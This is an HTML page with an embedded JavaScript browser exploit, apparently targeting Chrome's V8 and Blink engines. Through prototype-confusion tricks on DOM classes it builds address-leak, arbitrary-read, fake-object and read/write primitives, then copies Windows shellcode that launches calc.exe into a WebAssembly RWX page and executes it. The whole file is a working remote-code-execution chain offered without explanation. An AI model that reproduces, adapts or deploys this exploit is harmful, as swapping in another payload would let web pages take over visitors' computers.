<pre id="log"></pre>
<script>

function log(_string) {
	document.getElementById("log").innerHTML += `${_string}<br/>`
}

const loopCount = 0x20
var GLOBAL_arraybuffer_for_fake_obj = new ArrayBuffer(48);
var GLOBAL_arraybuffer_cafe40;
var GLOBAL_arraybuffer_cafe40_wrapper;
var GLOBAL_floatarray;
var GLOBAL_objarray;
var GLOBAL_func;

let ab = new ArrayBuffer(0x8);
let fab = new Float64Array(ab);
let uab = new BigUint64Array(ab);
let u32ab = new Uint32Array(ab);

function itof(_integer) {
	uab[0] = BigInt(_integer)
	return fab[0]
}

function ftoi(_float) {
	fab[0] = _float
	return uab[0]
}

function myftoi(_float) {
	fab[0] = _float
	return [u32ab[0], u32ab[1]]
}

function myitof(_lower, _upper) {
	u32ab[0] = _lower
	u32ab[1] = _upper
	return fab[0]
}

class TheMatrix extends DOMMatrix {
	constructor(address) {
		let input = [
                         itof(address-0x18), itof(address-0x18), itof(address-0x18), itof(address-0x18),
			 itof(address-0x18), itof(address-0x18), itof(address-0x18), itof(address-0x18),
			 itof(address-0x18), itof(address-0x18), itof(address-0x18), itof(address-0x18),
			 itof(address-0x18), itof(address-0x18), itof(address-0x18), itof(address-0x18),
		]
		super(input)
	}

	readPrimitive() {
		try {
			return super.interval;
		} catch(e) {
			return -1;	
		}
	}
}

class TheMatrixReloaded extends DOMMatrix {
	constructor(address) {
		let input = [
                         itof(address), itof(address), itof(address), itof(address),
			 itof(address), itof(address), itof(address), itof(address),
			 itof(address), itof(address), itof(address), itof(address),
			 itof(address), itof(address), itof(address), itof(address),
		]
		// needs to be an address from the blink heap
		super(input)
	}

	getFakeObject() {
		try {
			return super.signal; // this will return a v8 object
		} catch(e) {
			return -2;	
		}
	}
}

function triggerFakeObjectAt(i, corruptedTheMatrix, legitRequestObject) {
	legitRequestObject['a'+i] = 1
        TheMatrixReloaded.prototype.__proto__ = legitRequestObject
	legitRequestObject.signal
	return corruptedTheMatrix.getFakeObject()
}

function fakeObjAt(blinkAddress) {
	var sampleTheMatrix = new TheMatrixReloaded(blinkAddress);
	var sampleRequest = new Request({});
	for (let i = 0; i < loopCount; i+=1) {
		//test = triggerFakeObjectAt(i, sampleTheMatrix, sampleRequest);
		//%DebugPrint(test);
		triggerFakeObjectAt(i, sampleTheMatrix, sampleRequest);
		if (i === loopCount-1) return triggerFakeObjectAt(i, sampleTheMatrix, sampleRequest)
	}
}


class TheImageData extends ImageData {
	constructor(imageData, height, width) {
		super(imageData, height, width)
	}
	
	relativeAddrOfPrimitive() {
		try {
			return super.m13;
		} catch(e) {
			return -3;	
		}	
	}
}

function triggerArbitraryRead(i, corruptedTheMatrix, legitDeviceMotionEvent) {
	legitDeviceMotionEvent['a'+i] = 1
        TheMatrix.prototype.__proto__ = legitDeviceMotionEvent
	legitDeviceMotionEvent.interval
	return corruptedTheMatrix.readPrimitive()
}

function arbitraryRead(address) {
	var sampleTheMatrix = new TheMatrix(address);
	var sampleMotionEvent = new DeviceMotionEvent({});
	for (let i = 0; i < loopCount; i+=1) {
		triggerArbitraryRead(i, sampleTheMatrix, sampleMotionEvent)
		if (i === loopCount-1) return Number(ftoi(triggerArbitraryRead(i, sampleTheMatrix, sampleMotionEvent)))
	}
}

function triggerPartialAddrOf(i, corruptedTheImageData, legitDOMMatrix) {
	legitDOMMatrix['a'+i] = 1
	TheImageData.prototype.__proto__ = legitDOMMatrix
	legitDOMMatrix.m13
	return ftoi(corruptedTheImageData.relativeAddrOfPrimitive())
}

function partialAddrOf() {
	//var imageDataStore = new ArrayBuffer(48);
	%DebugPrint(GLOBAL_arraybuffer_for_fake_obj);
	var imageData      = new Uint8ClampedArray(GLOBAL_arraybuffer_for_fake_obj);
	%DebugPrint(imageData      );
	var domrect2 = new DOMRect([1, 1, 1, 1]);
	domrect2.x = itof(0x43434343n);
	domrect2.y = itof(0x44444444n);
	GLOBAL_arraybuffer_cafe40 = new ArrayBuffer(0xcafe40);
	GLOBAL_arraybuffer_cafe40_wrapper = new Uint32Array(GLOBAL_arraybuffer_cafe40);
	GLOBAL_floatarray = [1.1, 1.1, 1.1, 1.1];
	more = [2.2, 2.2, 2.2, 2.2];
	more1 = [3.3, 3.3, 3.3, 3.3];
	GLOBAL_objarray = [{}, {}, {}, {}];
	%DebugPrint(domrect2);
	%DebugPrint(GLOBAL_arraybuffer_cafe40 );
	%DebugPrint(GLOBAL_arraybuffer_cafe40_wrapper);
	%DebugPrint(GLOBAL_floatarray);
	%DebugPrint(GLOBAL_objarray);

	var sampleTheImageData = new TheImageData(imageData, 4, 3);
	var sampleDOMMatrix = new DOMMatrix([11, 12, 13, 14, 21, 22, 23, 24, 31, 32, 33, 34, 41, 42, 43, 44])
	for (let i = 0; i < loopCount; i+=1) {
		//console.log(triggerPartialAddrOf(i, sampleTheImageData, sampleDOMMatrix).toString(16))
		triggerPartialAddrOf(i, sampleTheImageData, sampleDOMMatrix)
		if (i === loopCount-1) return Number(triggerPartialAddrOf(i, sampleTheImageData, sampleDOMMatrix))
	}
}

let leakedImageDataAddress = partialAddrOf()
log("Blink Address of ImageData metadata (one of it at least): " + leakedImageDataAddress.toString(16))
let readAddress = arbitraryRead(leakedImageDataAddress);
log(`Reading ${leakedImageDataAddress.toString(16)} (I know that DOMRect is behind this): ` + readAddress.toString(16))
let domrectblink = leakedImageDataAddress-(0x8 * 0x1b) // calculate base on heuristics lmao and observation (and the fact that v8 heap is linear)
log("DOMRect Blink Location: " + domrectblink.toString(16));
let global_arraybuffer_backingstore_blink = domrectblink + 0x78 // calculate base on heuristics lmao and observation (and the fact that v8 heap is linear)
log("Global ArrayBuffer BackingStore Blink Location (for fakeobj creation later on): " + global_arraybuffer_backingstore_blink.toString(16));
let domrectv8 = arbitraryRead(arbitraryRead(leakedImageDataAddress-(0x8 * 0x1a))) // calculate base on heuristics lmao and observation (and the fact that v8 heap is linear)
log("DOMRect V8 Location: " + domrectv8.toString(16));
let arraybufferv8 = domrectv8+0x100+0xc0-0x4 // calculate base on heuristics lmao and observation (and the fact that v8 heap is linear)
log("ArrayBuffer cafe40 V8 Location: " + arraybufferv8.toString(16));
let floatArray = arraybufferv8+0x70+0x40 // calculate base on heuristics lmao and observation (and the fact that v8 heap is linear)
log("Float Array [1.1, 1.1, 1.1, 1.1] V8 Location: " + floatArray.toString(16));
log("Float Array first 1.1 V8 Location: " + (floatArray-0x1-0x20).toString(16));
log("Obj Array V8 Location: " + (floatArray+0x45c).toString(16)); // calculate base on heuristics lmao and observation (and the fact that v8 heap is linear)
let objArray = floatArray+0x108
arraybufferv8 -= 0x1

GLOBAL_arraybuffer_cafe40_wrapper[1] = 0x41424344

let [_lower1, _upper1] = myftoi(itof(arbitraryRead(arraybufferv8+0x18)));
let [_lower2, _upper2] = myftoi(itof(arbitraryRead(arraybufferv8+0x28)));
let cafe40_backingstore = ftoi(myitof(_upper1, _lower2))
log("ArrayBuffer cafe40 backingstore: " + cafe40_backingstore.toString(16))
log(`Reading ${cafe40_backingstore.toString(16)}: ` + arbitraryRead(Number(cafe40_backingstore)).toString(16))

/*
//alert()
log((BigInt(arbitraryRead(floatArray-1))-0x8n).toString(16)) // unstable
log((BigInt(arbitraryRead(floatArray-1+0x8))+0x0n).toString(16))
log((arbitraryRead(floatArray-1+0x10)).toString(16))
//log((arbitraryRead(floatArray-1+0x18)).toString(16))
//log((arbitraryRead(floatArray-1+0x20)).toString(16))
//log((arbitraryRead(floatArray-1+0x28)).toString(16))
//log((arbitraryRead(floatArray-1+0x30)).toString(16))
//log((arbitraryRead(floatArray-1+0x38)).toString(16))
//log((arbitraryRead(floatArray-1+0x40)).toString(16))
//log((arbitraryRead(floatArray-1+0x48)).toString(16))

let [element, length] = myftoi(itof((BigInt(arbitraryRead(floatArray-1+0x8))+0x0n)))
let givemeoob = ftoi(myitof(element, 0x100));
log(givemeoob.toString(16))

let [element2, length2] = myftoi(itof(arbitraryRead(floatArray-1+0x10)))
let givemeoob2 = ftoi(myitof(element2, 0x100));
log(givemeoob2.toString(16))

GLOBAL_floatarray[0] = itof(BigInt(arbitraryRead(floatArray-1))-0x17n)
//GLOBAL_floatarray[1] = itof(BigInt(arbitraryRead(floatArray-1+0x8))+0x40n)
//GLOBAL_floatarray[2] = itof(BigInt(arbitraryRead(floatArray-1+0x10)))
GLOBAL_floatarray[1] = itof(BigInt(givemeoob))
GLOBAL_floatarray[2] = itof(BigInt(givemeoob2))

let fakeObjectWrapper = new BigUint64Array(GLOBAL_arraybuffer_for_fake_obj);
fakeObjectWrapper[0] = BigInt(floatArray-0x20);
fakeObject = fakeObjAt(global_arraybuffer_backingstore_blink-0x8);
%DebugPrint("=====================================>");
%DebugPrint(fakeObject);
%DebugPrint(fakeObject[0]);

for (let i = 0 ; i < 100 ; i+=1) {
	log(ftoi(fakeObject[i]).toString(16))
}
*/

/*
we can assume we have oob write here
*/

/*
let fakeObjectWrapper = new BigUint64Array(GLOBAL_arraybuffer_for_fake_obj);
fakeObjectWrapper[0] = BigInt(domrectv8);
fakeObject = fakeObjAt(global_arraybuffer_backingstore_blink-0x8);
%DebugPrint(fakeObject);
*/




GLOBAL_floatarray[0] = itof(BigInt(arbitraryRead(floatArray-1))+(0x19n-0x38n)) // may have to +/- cause the arb read abit wonky
GLOBAL_floatarray[1] = itof(BigInt(arbitraryRead(floatArray-1+0x8))+(0x0n))    // may have to +/- cause the arb read abit wonky
GLOBAL_floatarray[2] = itof(BigInt(arbitraryRead(floatArray-1+0x10))+(0x0n))   // may have to +/- cause the arb read abit wonky


alert("create fakeobject/change floatarray-0x20")

let fakeObjectWrapper = new BigUint64Array(GLOBAL_arraybuffer_for_fake_obj);
fakeObjectWrapper[0] = BigInt(floatArray-0x20);
fakeObject = fakeObjAt(global_arraybuffer_backingstore_blink-0x8);
%DebugPrint("=====================================>");
%DebugPrint(fakeObject);
%DebugPrint(fakeObject[0]);


// arraybuffer +0x18 00c28000`00000000 (change higher) this is the lower backing store
// arraybuffer +0x20 00a0fab0`000016d0 (change lower)  this is the higher backing store
// arraybuffer +0x28 00000002`000016d0 (change lower)  this is the higher backing store
// instance    +0x60 00007280`a4e81000


function sandboxed_read(_address) {
	GLOBAL_floatarray[1] = myitof(_address-0x8, 0x8)
	return fakeObject[0]
}

function sandboxed_write(_address, _value) {
	GLOBAL_floatarray[1] = myitof(_address-0x8, 0x8)
	fakeObject[0] = itof(_value)
}

function sandboxed_addrOf(_object) {
	GLOBAL_objarray[0] = _object;
        let [objArrayLo, objArrayHi] = myftoi(itof(objArray))
	let [objArrayElement, objArrayLength] = myftoi(sandboxed_read(objArrayLo+0x8))
	let [whatwewant, objArrayElement2] = myftoi(sandboxed_read(objArrayElement+0x8))
	return whatwewant
}

//let [testlo, testhi] = myftoi(itof(domrectv8))
//log(ftoi(sandboxed_read(testlo)).toString(16))
//sandboxed_write(testlo+0x8n, 0x4141414142424242n) // prevent crash while still allowing you to verify write

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);
%DebugPrint(wasmInstance);
var func = wasmInstance.exports.main;
wasmInstanceAddr = sandboxed_addrOf(wasmInstance);
rwx = ftoi(sandboxed_read(wasmInstanceAddr + 0x60));
log("RWX page: " + rwx.toString(16))
let [rwxlo, rwxhi] = myftoi(itof(rwx));

var rceAb = new ArrayBuffer(0x1024);
var rceAbWrapper = new Uint8Array(rceAb);
%DebugPrint(rceAb);
rceAbAddr = sandboxed_addrOf(rceAb);

let [lo1, changemetolower32ofrwx1] = myftoi(sandboxed_read(rceAbAddr+0x18));
let [changemetoupper32ofrwx2, hi2] = myftoi(sandboxed_read(rceAbAddr+0x20));
let [changemetoupper32ofrwx3, hi3] = myftoi(sandboxed_read(rceAbAddr+0x28));
let [lo4, changemetolower32ofrwx4] = myftoi(sandboxed_read(rceAbAddr+0x68));
let [changemetoupper32ofrwx5, hi5] = myftoi(sandboxed_read(rceAbAddr+0x70));

sandboxed_write(rceAbAddr+0x18, ftoi(myitof(lo1, rwxlo)));
sandboxed_write(rceAbAddr+0x20, ftoi(myitof(rwxhi, hi2)));
sandboxed_write(rceAbAddr+0x28, ftoi(myitof(rwxhi, hi3)));
sandboxed_write(rceAbAddr+0x68, ftoi(myitof(lo4, rwxlo)));
sandboxed_write(rceAbAddr+0x70, ftoi(myitof(rwxhi, hi5)));

let calc_shellcode = new Uint8Array(
    [   0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 
        0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
        0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,
        0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
        0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED,
        0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,
        0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
        0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48,
        0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1,
        0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
        0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,
        0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A,
        0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
        0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B,
        0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
        0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47,
        0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E,
        0x65, 0x78, 0x65, 0x00
    ]
);
rceAbWrapper.set(calc_shellcode);
func();
</script>